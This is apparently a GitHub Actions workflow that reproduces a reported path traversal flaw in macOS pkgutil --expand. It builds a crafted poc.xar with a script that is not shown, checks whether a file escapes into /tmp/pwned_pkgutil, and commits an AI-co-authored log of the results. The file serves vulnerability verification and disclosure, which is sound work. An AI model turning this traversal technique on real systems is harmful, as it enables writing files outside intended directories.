name: pkgutil Path Traversal PoC OE1104428478322

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  run-poc:
    runs-on: macos-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build poc.xar
        run: python3 build_poc_xar.py

      - name: Inspect poc.xar
        run: python3 inspect_poc.py poc.xar

      - name: Run PoC — pkgutil --expand path traversal
        run: |
          mkdir -p results
          {
            echo "======================================"
            echo "  pkgutil Path Traversal PoC"
            echo "  Report: OE1104428478322"
            echo "======================================"
            echo ""
            echo "=== System ==="
            sw_vers
            uname -m
            echo ""
            echo "=== pkgutil location ==="
            which pkgutil
            file "$(which pkgutil)"
            pkgutil --version 2>/dev/null || echo "(no --version flag)"
            echo ""
            echo "=== poc.xar embedded filename ==="
            python3 inspect_poc.py poc.xar
            echo ""
            echo "=== Running: pkgutil --expand poc.xar /tmp/safe_expand_dir ==="
            SAFE_DIR=/tmp/safe_expand_dir
            ESCAPED=/tmp/pwned_pkgutil
            rm -rf "$SAFE_DIR" "$ESCAPED"
            # NOTE: do NOT mkdir - pkgutil creates the destination itself
            set -x
            pkgutil --expand poc.xar "$SAFE_DIR" 2>&1; PKGUTIL_EXIT=$?
            set +x
            echo "pkgutil exit code: $PKGUTIL_EXIT"
            echo ""
            echo "=== Contents inside safe_expand_dir (recursive) ==="
            find "$SAFE_DIR" 2>/dev/null | while read f; do
              echo "  $f"
              [ -f "$f" ] && echo "    contents: $(cat "$f" 2>/dev/null || echo '(binary)')"
            done
            echo ""
            echo "=== Broader /tmp scan for unexpected writes ==="
            find /tmp -maxdepth 4 2>/dev/null | sort
            echo ""
            echo "=== Out-of-bounds check: /tmp/pwned_pkgutil ==="
            if [ -e "$ESCAPED" ]; then
              echo "RESULT: VULNERABLE"
              echo "File written OUTSIDE expansion directory:"
              ls -la "$ESCAPED"
              echo "Contents: $(cat "$ESCAPED")"
            else
              echo "RESULT: /tmp/pwned_pkgutil NOT created"
              # Also check if pkgutil created it inside the safe dir under a mangled name
              echo ""
              echo "=== Any file containing 'pwned' anywhere in /tmp ==="
              find /tmp -name '*pwned*' 2>/dev/null || echo "(none)"
              echo ""
              echo "=== Any file containing traversal payload ==="
              grep -rl 'pwned via pkgutil' /tmp 2>/dev/null || echo "(none)"
            fi
          } | tee results/poc_terminal_log.txt

      - name: Collect and commit results
        if: always()
        run: |
          git config user.email "poc-bot@github-actions"
          git config user.name "GitHub Actions"
          git add results/
          MSG="results: poc run $(date -u +%Y-%m-%dT%H:%M:%SZ)"$'\n\n'"Co-Authored-By: Claude Sonnet 4.6 <noreply@anthropic.com>"$'\n'"Claude-Session: https://claude.ai/code/session_016osine6GRgdkb8UHqaRAGM"
          git commit -m "$MSG" || echo "nothing to commit"
          git push origin main

      - name: Upload artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: poc-results-${{ github.run_id }}
          path: |
            poc.xar
            build_poc_xar.py
            inspect_poc.py
            results/
          retention-days: 90
